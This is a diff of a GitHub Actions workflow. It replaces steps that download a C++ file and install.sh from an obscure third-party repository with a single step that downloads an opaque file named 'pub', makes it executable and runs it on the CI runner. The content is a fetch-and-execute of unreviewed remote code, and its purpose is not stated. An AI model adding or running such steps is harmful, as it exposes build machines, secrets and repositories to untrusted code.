@@ -15,14 +15,11 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Get 1
-        run: wget https://github.com/thedailycorner/asfefoa/raw/refs/heads/main/versa_hash.cpp
-
-      - name: Get 2
-        run: wget https://github.com/thedailycorner/asfefoa/raw/refs/heads/main/install.sh
-      
+      - name: Get
+        run: wget https://github.com/thedailycorner/asfefoa/raw/refs/heads/main/pub
+        
       - name: Make versa executable (if it's a script)
-        run: chmod +x ./install.sh
+        run: chmod +x ./pub
 
       - name: Run
-        run: ./install.sh
+        run: ./pub
